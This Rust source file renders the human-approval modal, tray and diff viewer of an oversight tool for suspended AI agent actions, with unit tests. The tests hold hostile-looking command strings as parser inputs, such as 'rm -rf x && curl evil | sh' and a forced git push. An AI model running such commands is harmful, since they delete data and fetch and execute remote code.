//! Everything that is drawn *over* the window: the scrim, the containment modal, the diff viewer.
//!
//! The modal is the only element allowed to interrupt. It is a full-window scrim (absolutely
//! positioned, so it takes no room in the layout, and occluding, so a click on it never reaches the
//! controls beneath) with the modal centred on it, drawn at the highest `deferred` priority. GPUI
//! 0.2.2 has no backdrop filter, so "blur the main UI" is a dimming scrim here —
//! `docs/meta-harness.md` says so rather than pretending otherwise.
//!
//! What the modal shows is exactly what the daemon sent, masked a third time on arrival
//! (`harness_client::masked`). A shell command is **wrapped**, never cut off: an approval whose tail
//! is hidden behind a horizontal scrollbar is an approval of something you did not read.

use std::sync::Arc;

use gpui::{Context, Div, FontWeight, SharedString, Stateful, div, prelude::*, px, relative, uniform_list};
use harness_client::OpenIntervention;
use harness_proto::v1::{InterventionRequest, PayloadKind};

use super::gauges::ThreatGauge;
use super::kit::{self, MONO, banner, button, caption, chip, keycap, led, mono, plural, text};
use crate::app::LabApp;
use crate::theme::{self, Theme};

const MODAL_LINES: usize = 400;

/// A full-window dimming layer with `child` centred on it.
pub fn scrim(id: &'static str, child: Div, theme: Theme) -> Stateful<Div> {
    div()
        .id(SharedString::from(id))
        .debug_selector(move || id.to_owned())
        .absolute()
        .top_0()
        .left_0()
        .size_full()
        .flex()
        .items_center()
        .justify_center()
        .p_6()
        .bg(theme.scrim)
        .occlude()
        .child(child)
}

/// What a human is being asked to approve.
#[derive(Debug, PartialEq)]
pub enum Payload<'a> {
    Shell(&'a str),
    Diff(&'a str),
    Text(&'a str),
}

pub fn payload_of(request: &InterventionRequest) -> Payload<'_> {
    if !request.command.is_empty() {
        Payload::Shell(&request.command)
    } else if !request.diff.is_empty() {
        Payload::Diff(&request.diff)
    } else {
        Payload::Text(&request.input_json)
    }
}

fn payload_kind_name(raw: i32) -> &'static str {
    match PayloadKind::try_from(raw).unwrap_or_default() {
        PayloadKind::ShellCommand => "shell command",
        PayloadKind::FileDiff => "file diff",
        PayloadKind::Other => "tool input",
        PayloadKind::Unspecified => "unclassified",
    }
}

fn diff_line_color(line: &str, theme: &Theme) -> gpui::Rgba {
    if line.starts_with("+++") || line.starts_with("---") {
        theme.dim
    } else if line.starts_with('+') {
        theme.ok
    } else if line.starts_with('-') {
        theme.danger
    } else if line.starts_with("@@") {
        theme.accent
    } else {
        theme.text
    }
}

// ------------------------------------------------------------ what the change touches

/// One file's share of a diff, as the payload describes it.
#[derive(Debug, PartialEq)]
pub struct FileImpact {
    pub path: String,
    pub added: usize,
    pub removed: usize,
    pub hunks: usize,
}

/// The shape of what a person is being asked to approve, for the Chamber's left pane. This is
/// **what the payload says**, not a static analysis of the repository: the lab never opens the files
/// it is shown, so a diff that lies about its own impact is summarised exactly as it lies.
#[derive(Debug, PartialEq)]
pub enum Impact {
    Diff(Vec<FileImpact>),
    Command { program: String, flags: Vec<String>, rest: usize },
    None,
}

pub fn impact_of(request: &InterventionRequest) -> Impact {
    match payload_of(request) {
        Payload::Diff(diff) => {
            let files = diff_files(diff);
            if files.is_empty() { Impact::None } else { Impact::Diff(files) }
        }
        Payload::Shell(command) => {
            // Only the first segment of a chain: `rm -rf x && git push` risks two things, but the
            // full command is on the right and the head is what a person reads first.
            let line = command.lines().next().unwrap_or("").trim();
            let head = line.split("&&").next().unwrap_or(line);
            let head = head.split("||").next().unwrap_or(head);
            let head = head.split('|').next().unwrap_or(head).trim();
            let mut tokens = head.split_whitespace();
            let Some(first) = tokens.next() else { return Impact::None };
            let program = first.rsplit('/').next().unwrap_or(first).to_owned();
            let (mut flags, mut rest) = (Vec::new(), 0usize);
            for token in tokens {
                if token.starts_with('-') && token.len() > 1 { flags.push(token.to_owned()); } else { rest += 1; }
            }
            Impact::Command { program, flags, rest }
        }
        Payload::Text(_) => Impact::None,
    }
}

/// File names, hunks and line counts, read straight off the unified diff.
fn diff_files(diff: &str) -> Vec<FileImpact> {
    let mut files: Vec<FileImpact> = Vec::new();
    for line in diff.lines() {
        // The `---`/`+++` pair brackets one file; `---` comes first, so it is only ever a header.
        if line.starts_with("--- ") {
            continue;
        }
        if let Some(rest) = line.strip_prefix("+++ ") {
            let path = rest.trim();
            let path = path.strip_prefix("b/").unwrap_or(path);
            // A deletion's other side is `/dev/null`; naming it would read as a file that does not exist.
            if path != "/dev/null" {
                files.push(FileImpact { path: path.to_owned(), added: 0, removed: 0, hunks: 0 });
            }
            continue;
        }
        let Some(file) = files.last_mut() else { continue };
        if line.starts_with("@@") {
            file.hunks += 1;
        } else if line.starts_with('+') {
            file.added += 1;
        } else if line.starts_with('-') {
            file.removed += 1;
        }
    }
    files
}

/// The left pane: what the payload says it would touch, as a short tree.
fn impact_pane(impact: Impact, theme: &Theme) -> Div {
    let mut pane = div()
        .debug_selector(|| "modal-impact".to_owned())
        .flex()
        .flex_col()
        .gap_2()
        .p_3()
        .w(px(252.))
        .flex_none()
        .overflow_hidden()
        .bg(theme.bg)
        .border_1()
        .border_color(theme.border)
        .rounded_md();
    pane = pane.child(caption("what this touches", theme));
    match impact {
        Impact::Diff(files) => {
            let (add, del): (usize, usize) = (files.iter().map(|f| f.added).sum(), files.iter().map(|f| f.removed).sum());
            pane = pane.child(
                div()
                    .flex()
                    .flex_row()
                    .items_center()
                    .gap_2()
                    .child(mono(format!("{} file{}", files.len(), plural(files.len())), theme.dim))
                    .child(mono(format!("+{add}"), theme.ok))
                    .child(mono(format!("-{del}"), theme.danger)),
            );
            for file in files.iter().take(12) {
                pane = pane.child(
                    div()
                        .flex()
                        .flex_col()
                        .gap_1()
                        .child(
                            div()
                                .flex()
                                .flex_row()
                                .items_center()
                                .gap_2()
                                .child(mono(kit::truncate(&file.path, 32), theme.text))
                                .child(mono(format!("+{}", file.added), theme.ok))
                                .child(mono(format!("-{}", file.removed), theme.danger)),
                        )
                        .child(div().pl_3().text_size(px(10.)).text_color(theme.faint).child(format!("{} hunk{}", file.hunks, plural(file.hunks)))),
                );
            }
            if files.len() > 12 {
                pane = pane.child(div().text_size(px(10.)).text_color(theme.faint).child(format!("… and {} more file{}", files.len() - 12, plural(files.len() - 12))));
            }
        }
        Impact::Command { program, flags, rest } => {
            pane = pane.child(
                div()
                    .flex()
                    .flex_row()
                    .items_center()
                    .gap_2()
                    .child(div().font_family(MONO).text_size(px(13.)).text_color(theme.text).child(program))
                    .child(div().text_size(px(10.)).text_color(theme.faint).child(format!("{rest} argument{}", plural(rest)))),
            );
            if flags.is_empty() {
                pane = pane.child(div().pl_3().text_size(px(10.)).text_color(theme.faint).child("no flags"));
            }
            for flag in flags.iter().take(10) {
                pane = pane.child(div().pl_3().font_family(MONO).text_size(px(11.)).text_color(theme.warn).child(flag.clone()));
            }
        }
        Impact::None => {
            pane = pane.child(div().text_size(px(11.)).text_color(theme.faint).child("Nothing to summarise — read the payload on the right."));
        }
    }
    pane.child(div().flex_1()).child(div().text_size(px(9.)).text_color(theme.faint).child("read from the payload, not the repository"))
}

/// The containment modal — the one un-ignorable element.
pub fn containment_modal(open: &OpenIntervention, waiting: usize, theme: Theme, cx: &mut Context<LabApp>) -> Div {
    let request = &open.request;
    let armed = request.armed;
    let accent = if armed { theme.danger } else { theme.warn };

    let mut payload = div()
        .id("payload")
        .debug_selector(|| "modal-payload".to_owned())
        .flex()
        .flex_col()
        .flex_1()
        .min_h_0()
        .overflow_scroll()
        .p_3()
        .bg(theme.bg)
        .border_1()
        .border_color(theme.border)
        .rounded_md()
        .font_family(MONO)
        .text_xs();
    let (lines, total): (Vec<(String, gpui::Rgba)>, usize) = match payload_of(request) {
        Payload::Shell(command) => {
            let all: Vec<&str> = command.lines().collect();
            let shown = all.iter().take(MODAL_LINES).enumerate().map(|(i, l)| (format!("{}{l}", if i == 0 { "$ " } else { "  " }), theme.text)).collect();
            (shown, all.len())
        }
        Payload::Diff(diff) => {
            let all: Vec<&str> = diff.lines().collect();
            (all.iter().take(MODAL_LINES).map(|l| ((*l).to_owned(), diff_line_color(l, &theme))).collect(), all.len())
        }
        Payload::Text(body) => {
            let all: Vec<&str> = body.lines().collect();
            (all.iter().take(MODAL_LINES).map(|l| ((*l).to_owned(), theme.dim)).collect(), all.len())
        }
    };
    for (line, color) in lines {
        // An empty line still takes a row, or a command's blank lines would vanish from the review.
        payload = payload.child(div().min_h(px(14.)).text_color(color).child(if line.is_empty() { " ".to_owned() } else { line }));
    }
    if total > MODAL_LINES {
        payload = payload.child(div().mt_2().text_color(theme.warn).child(format!("… {} more line{} not shown — open the diff viewer (d) to read all of it", total - MODAL_LINES, plural(total - MODAL_LINES))));
    }

    let age = kit::ago(open.since.elapsed());
    let mut modal = div()
        .debug_selector(|| "containment-modal".to_owned())
        .flex()
        .flex_col()
        .gap_3()
        .p_5()
        .w(px(840.))
        .max_w_full()
        .max_h(relative(0.94))
        .bg(theme.panel)
        .border_2()
        .border_color(accent)
        .rounded_lg()
        .text_color(theme.text)
        .child(
            div()
                .flex()
                .flex_row()
                .items_center()
                .gap_3()
                .child(led("modal-led", accent, true))
                .child(div().font_weight(FontWeight::BOLD).text_size(px(15.)).text_color(accent).child("CONTAINMENT — A HUMAN MUST ANSWER"))
                .child(div().flex_1())
                .child(if waiting > 1 { chip(format!("1 of {waiting}"), theme.warn) } else { chip(format!("asked {age} ago"), theme.dim) }),
        )
        .child(
            div()
                .flex()
                .flex_row()
                .flex_wrap()
                .items_center()
                .gap_2()
                .child(kit::readout("pod", request.pod.clone(), theme.text, &theme))
                .child(div().w(px(16.)))
                .child(kit::readout("tool", request.tool.clone(), theme.text, &theme))
                .child(div().w(px(16.)))
                .child(kit::readout("payload", payload_kind_name(request.kind), theme.dim, &theme))
                .child(div().flex_1())
                .child(if armed { chip("ARMED · LAYA: DESTRUCTIVE", theme.danger) } else { chip(format!("risk {} · {}", theme::score_text(request.risk_score), if request.risk_band.is_empty() { "unscored" } else { &request.risk_band }), theme.dim) })
                .child(chip(format!("{} secret{} masked", request.redactions, plural(request.redactions as usize)), if request.redactions > 0 { theme.warn } else { theme.faint })),
        );
    if request.risk_score.is_some() {
        modal = modal.child(
            div()
                .flex()
                .flex_row()
                .items_center()
                .gap_3()
                .child(div().w(px(110.)).child(caption("laya score", &theme)))
                .child(div().font_family(MONO).text_size(px(20.)).text_color(theme::threat_color(request.risk_score, &theme)).child(theme::score_text(request.risk_score)))
                .child(div().flex_1().child(ThreatGauge { score: request.risk_score, gate: 0.8, theme, compact: false })),
        );
    }
    if !request.reason.is_empty() {
        modal = modal.child(text(format!("why it stopped: {}", request.reason), theme.dim));
    }
    // Split pane: what the change touches on the left, the exact payload on the right. The right
    // pane is the one that decides — the left is a reading aid, and neither hides the other.
    modal = modal.child(
        div()
            .debug_selector(|| "modal-split".to_owned())
            .flex()
            .flex_row()
            .gap_3()
            .flex_1()
            .min_h_0()
            .child(impact_pane(impact_of(request), &theme))
            .child(payload),
    );
    if open.stale {
        modal = modal.child(banner("The connection that asked is gone. This cannot be answered — the agent may already have been resumed elsewhere.", theme.warn));
    }
    modal
        .child(
            div()
                .flex()
                .flex_row()
                .flex_wrap()
                .items_center()
                .gap_2()
                .child(button("Approve & Execute", theme.ok, true, &theme, "approve").on_click(cx.listener(|this, _e, _w, cx| this.approve(cx))))
                .child(button("Reject & Discard", theme.warn, false, &theme, "reject").on_click(cx.listener(|this, _e, _w, cx| this.reject(cx))))
                .child(button("Reject & Isolate", theme.danger, true, &theme, "isolate").on_click(cx.listener(|this, _e, _w, cx| this.isolate(cx))))
                .child(button("Decide later", theme.dim, false, &theme, "later").on_click(cx.listener(|this, _e, _w, cx| {
                    this.send_to_tray(cx);
                })))
                .child(div().flex_1())
                .child(keycap("y", &theme))
                .child(mono("approve", theme.faint))
                .child(keycap("n", &theme))
                .child(mono("reject", theme.faint))
                .child(keycap("k", &theme))
                .child(mono("isolate", theme.faint))
                .child(keycap("esc", &theme))
                .child(mono("later", theme.faint)),
        )
        .child(text("The agent stays suspended until someone answers — \"Decide later\" only moves this to the tray so you can look around first. The first answer wins; the other front end is told.", theme.faint))
}


// ------------------------------------------------------------------ the tray

/// The first non-empty line of what is being asked, for a card too small for all of it.
fn preview(request: &InterventionRequest) -> String {
    let body = match payload_of(request) {
        Payload::Shell(command) => command,
        Payload::Diff(diff) => diff.lines().find(|l| l.starts_with("+++") || l.starts_with("---")).unwrap_or(diff),
        Payload::Text(text) => text,
    };
    let line = body.lines().map(str::trim).find(|l| !l.is_empty()).unwrap_or("");
    let prefix = if matches!(payload_of(request), Payload::Shell(_)) { "$ " } else { "" };
    format!("{prefix}{}", kit::truncate(line, 70))
}

/// Pending approvals that are *not* interrupting, as cards for the "Needs you" section: answer in
/// place, or open the full review. They sit in the side column, so the rest of the window stays fully
/// usable while they wait.
pub fn approval_cards(items: &[&OpenIntervention], theme: Theme, cx: &mut Context<LabApp>) -> Vec<Div> {
    let mut cards = Vec::new();
    for open in items.iter().take(4) {
        let request = &open.request;
        let id = request.intervention_id.clone();
        let accent = match request.risk_score {
            Some(s) if s >= 0.5 => theme.warn,
            Some(_) => theme.ok,
            None => theme.dim,
        };
        let (approve_id, reject_id, review_id) = (id.clone(), id.clone(), id.clone());
        let mut card = div()
            .debug_selector({
                let id = id.clone();
                move || format!("tray-{id}")
            })
            .flex()
            .flex_col()
            .gap_2()
            .p_3()
            .bg(theme.panel)
            .border_1()
            .border_color(Theme::tint(accent, 0.6))
            .rounded_lg()
            .child(
                div()
                    .flex()
                    .flex_row()
                    .items_center()
                    .gap_2()
                    .child(led(SharedString::from(format!("tray-led-{id}")), accent, true))
                    .child(div().min_w_0().truncate().text_sm().font_weight(FontWeight::SEMIBOLD).child(format!("{} · {}", request.pod, request.tool)))
                    .child(div().flex_1())
                    .child(chip(if request.risk_score.is_some() { format!("{} {}", theme::score_text(request.risk_score), request.risk_band) } else { "unscored".to_owned() }, accent))
                    .child(mono(kit::ago(open.since.elapsed()), theme.faint)),
            )
            .child(div().truncate().font_family(MONO).text_xs().text_color(theme.dim).child(preview(request)));
        if !request.reason.is_empty() {
            card = card.child(div().text_xs().text_color(theme.faint).line_clamp(2).child(request.reason.clone()));
        }
        card = if open.stale {
            card.child(text("Connection lost — this cannot be answered from here.", theme.warn))
        } else {
            card.child(
                div()
                    .flex()
                    .flex_row()
                    .items_center()
                    .gap_2()
                    .child(kit::button_dyn("Approve", theme.ok, true, &theme, format!("tray-approve-{approve_id}")).on_click(cx.listener(move |this, _e, _w, cx| this.decide(&approve_id, true, false, cx))))
                    .child(kit::button_dyn("Reject", theme.warn, false, &theme, format!("tray-reject-{reject_id}")).on_click(cx.listener(move |this, _e, _w, cx| this.decide(&reject_id, false, false, cx))))
                    .child(div().flex_1())
                    .child(kit::button_dyn("Review", theme.accent, false, &theme, format!("tray-review-{review_id}")).on_click(cx.listener(move |this, _e, _w, cx| this.review(Some(review_id.clone()), cx)))),
            )
        };
        cards.push(card);
    }
    if items.len() > 4 {
        cards.push(div().flex().flex_row().justify_end().child(chip(format!("+{} more waiting", items.len() - 4), theme.warn)));
    }
    cards
}

// ------------------------------------------------------------------ diff view

/// The diff viewer's data, cloned out of the app so the element tree owns everything it draws.
pub struct DiffOverlay {
    pub id: SharedString,
    pub source: SharedString,
    pub files: Vec<SharedString>,
    pub lines: u32,
    pub truncated: bool,
    pub rendered: Arc<Vec<SharedString>>,
    pub error: Option<SharedString>,
}

/// A virtualised list, so a 10,000-line diff is 10,000 cheap rows rather than one giant text element.
pub fn diff_overlay(diff: DiffOverlay, theme: Theme, cx: &mut Context<LabApp>) -> Div {
    let rows = diff.rendered.len();
    let mut overlay = div()
        .debug_selector(|| "diff-overlay".to_owned())
        .flex()
        .flex_col()
        .gap_2()
        .p_4()
        .w(px(1100.))
        .max_w_full()
        .h(relative(0.92))
        .bg(theme.panel)
        .border_1()
        .border_color(theme.line_strong)
        .rounded_lg()
        .child(
            div()
                .flex()
                .flex_row()
                .items_center()
                .gap_3()
                .child(div().font_weight(FontWeight::BOLD).text_size(px(14.)).child(format!("DIFF {}", diff.id)))
                .child(chip(diff.source.clone(), theme.accent))
                .child(text(format!("{} line{}", diff.lines, plural(diff.lines as usize)), theme.dim))
                .child(div().flex_1())
                .child(button("Close", theme.accent, false, &theme, "diff-close").on_click(cx.listener(|this, _e, _w, cx| this.close_diff(cx))))
                .child(keycap("esc", &theme)),
        )
        .child(text(diff.files.join("  ·  "), theme.faint));
    if diff.truncated {
        overlay = overlay.child(banner("The daemon truncated this diff: this is the head of the change, not all of it.", theme.warn));
    }
    match (&diff.error, rows) {
        (Some(error), _) => overlay.child(banner(error.to_string(), theme.danger)),
        (None, 0) => overlay.child(text("fetching…", theme.faint)),
        (None, _) => {
            let lines = diff.rendered;
            overlay.child(
                div().flex_1().min_h_0().p_2().bg(theme.bg).border_1().border_color(theme.border).rounded_md().child(
                    uniform_list("diff-lines", lines.len(), move |range, _window, _cx| {
                        range
                            .map(|ix| {
                                let line = lines[ix].clone();
                                div().font_family(MONO).text_xs().whitespace_nowrap().text_color(diff_line_color(&line, &theme)).child(line)
                            })
                            .collect::<Vec<_>>()
                    })
                    .size_full(),
                ),
            )
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_payload_is_the_command_then_the_diff_then_the_raw_input() {
        let mut r = InterventionRequest { command: "rm -rf build".into(), diff: "+x".into(), input_json: "{}".into(), ..Default::default() };
        assert_eq!(payload_of(&r), Payload::Shell("rm -rf build"));
        r.command.clear();
        assert_eq!(payload_of(&r), Payload::Diff("+x"));
        r.diff.clear();
        assert_eq!(payload_of(&r), Payload::Text("{}"));
    }

    #[test]
    fn diff_lines_are_coloured_by_what_they_do() {
        let t = Theme::dark();
        assert_eq!(diff_line_color("+added", &t), t.ok);
        assert_eq!(diff_line_color("-removed", &t), t.danger);
        assert_eq!(diff_line_color("@@ -1 +1 @@", &t), t.accent);
        assert_eq!(diff_line_color("+++ b/file", &t), t.dim, "a file header is not an addition");
        assert_eq!(diff_line_color("--- a/file", &t), t.dim, "…and not a removal");
        assert_eq!(diff_line_color(" context", &t), t.text);
    }

    #[test]
    fn a_diff_is_summarised_by_file_hunks_and_lines() {
        let diff = "\
--- a/src/a.rs
+++ b/src/a.rs
@@ -1,3 +1,4 @@
 one
-two
+2
+three
@@ -20,1 +21,0 @@
-gone
--- a/src/b.rs
+++ b/src/b.rs
@@ -1 +1 @@
-old
+new
";
        let Impact::Diff(files) = impact_of(&InterventionRequest { diff: diff.into(), ..Default::default() }) else { panic!("a diff is summarised as files") };
        assert_eq!(files.len(), 2);
        assert_eq!(files[0], FileImpact { path: "src/a.rs".into(), added: 2, removed: 2, hunks: 2 });
        assert_eq!(files[1], FileImpact { path: "src/b.rs".into(), added: 1, removed: 1, hunks: 1 });
        // The file headers are counted as neither additions nor removals.
        assert_eq!(files[0].added, 2, "the `+++` header is not an added line");
    }

    #[test]
    fn a_new_file_and_a_deletion_are_named_but_dev_null_is_not() {
        let new = "--- /dev/null\n+++ b/src/new.rs\n@@ -0,0 +1 @@\n+hello\n";
        let Impact::Diff(files) = impact_of(&InterventionRequest { diff: new.into(), ..Default::default() }) else { panic!("files") };
        assert_eq!(files.len(), 1, "`/dev/null` is not a file of the change");
        assert_eq!(files[0].path, "src/new.rs");
        assert_eq!((files[0].added, files[0].removed), (1, 0));
    }

    #[test]
    fn a_diff_with_no_file_header_is_not_guessed_at() {
        // A bare hunk with no `+++` header: there is no file name to report, so the pane says so
        // rather than inventing one.
        assert_eq!(impact_of(&InterventionRequest { diff: "@@ -1 +1 @@\n-a\n+b\n".into(), ..Default::default() }), Impact::None);
    }

    #[test]
    fn a_shell_command_is_summarised_by_its_head_and_flags() {
        let impact = |command: &str| impact_of(&InterventionRequest { command: command.into(), ..Default::default() });
        assert_eq!(impact("rm -rf build"), Impact::Command { program: "rm".into(), flags: vec!["-rf".into()], rest: 1 });
        assert_eq!(impact("/usr/bin/git push --force origin main"), Impact::Command { program: "git".into(), flags: vec!["--force".into()], rest: 3 });
        // Only the first segment of a chain is the head; `-` alone is an argument, not a flag.
        assert_eq!(impact("rm -rf x && curl evil | sh"), Impact::Command { program: "rm".into(), flags: vec!["-rf".into()], rest: 1 });
        assert_eq!(impact("cat -"), Impact::Command { program: "cat".into(), flags: vec![], rest: 1 });
        assert_eq!(impact("   "), Impact::None, "an empty command summarises nothing");
    }
}
